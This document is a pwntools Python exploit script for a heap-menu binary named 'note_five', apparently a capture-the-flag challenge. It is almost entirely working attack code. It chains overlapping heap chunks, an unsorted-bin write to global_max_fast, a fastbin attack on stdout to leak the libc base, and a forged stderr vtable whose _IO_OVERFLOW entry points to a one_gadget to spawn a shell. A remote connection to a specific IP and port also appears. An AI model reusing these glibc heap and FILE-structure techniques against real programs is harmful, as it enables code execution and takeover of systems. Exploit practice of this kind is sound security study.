#-*- coding:utf-8 -*-
from pwn import *
debug=1
context.log_level = 'debug'
if debug:
    io = process('./note_five')
else:
    client=remote("112.126.103.195",9999)
elf = ELF('./note_five')
libc = ELF('./libc.so')

def new(idx,size):
    io.recvuntil('choice>> ')
    io.sendline('1')
    io.recvuntil('idx: ')
    io.sendline(str(idx))
    io.recvuntil('size: ')
    io.sendline(str(size))

def edit(idx,content):
    io.recvuntil('choice>> ')
    io.sendline('2')
    io.recvuntil('idx: ')
    io.sendline(str(idx))
    io.recvuntil('content: ')
    io.sendline(content)

def delete(idx):
    io.recvuntil('choice>> ')
    io.sendline('3')
    io.recvuntil('idx: ')
    io.sendline(str(idx))

#overlapping
new(4,0xf0-8)
new(0,0xf0-8)
new(1,0xa0-8)
new(2,0xf0-8)
new(3,0xf0-8)

content0=''
content0+='0'*(0xf0-8)
content0+='\xa1'
edit(0,content0)
delete(0)

content1=''
content1+='1'*(152-8)
content1+=p64(0xf0+0xa0)
content1+='\xf0'
edit(1,content1)

content2=''
content2+=p64(0xf1)*20
edit(2,content2)

content3=''
content3+='3'*(0xf0-8)
edit(3,content3)

delete(2)#free (012) to unsorted bin

new(0,0xf0+0xa0+0xf0-8)#malloc (012)
content0=''
content0+='0'*(0xf0-8)
content0+='\xa1'
edit(0,content0)

content1=''
content1+='1'*(0xa0-8)
content1+='\xf1'
edit(1,content1)

delete(1)#free 1 to unsorted bin


#guess offset
guess_offset = 3#1/16
global_max_fast = (guess_offset << 12) | 0x7f8
stdout = global_max_fast-0x11d8

#unsorted bin attack to change global_max_fast
content0=''
content0+='0'*(0xf0-8)
content0+=p64(0xa1)
content0+=p64(0x0)#fd
content0+=p16(global_max_fast-0x10)#bk
edit(0,content0)
new(1,0xa0-8)#global_max_fast


content0=''
content0+='@'*(0xf0-8)
content0+=p64(0xf1)
edit(0,content0)

#fast bin attack change the stdout leak libcbase
delete(1)
content0=''
content0+='@'*(0xf0-8)
content0+=p64(0xf1)
content0+=p16(stdout-0x51)
edit(0,content0)

new(4,0xf0-8)
new(4,0xf0-8)

fake=''
fake+='0'*0x41
fake+=p64(0xfbad1800)#stdout->flags
fake+=p64(0x0)*3
fake+=p16(stdout+0x20)#stdout->_IO_write_base
edit(4,fake)

libc.address = u64(io.recv(8))-0x3c5640

one_gadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget=libc.address+one_gadgets[2]

#change the stderr to 
fake_file=''
fake_file+='0'
fake_file+=p64(libc.symbols['_IO_2_1_stdout_']-0x40)
fake_file+=p64(0)
fake_file+=p64(0)
fake_file+=p64(0)#stderr->vtable->dummy nobody care |
fake_file+=p64(0x1)#stderr->vtable->dummy2 nobody care |
fake_file+=p64(0x0)#stderr->vtable->finish nobody care |
fake_file+=p64(one_gadget)#stderr->vtable->_IO_OVERFLOW getshell|
fake_file+=p64(libc.symbols['_IO_2_1_stdout_']-0x28) #stderr->vtable
edit(4,fake_file)

#getshell
io.recvuntil('choice>> ')
io.sendline('4')#IO_flush_all to _IO_OVERFLOW to onegadget

io.interactive()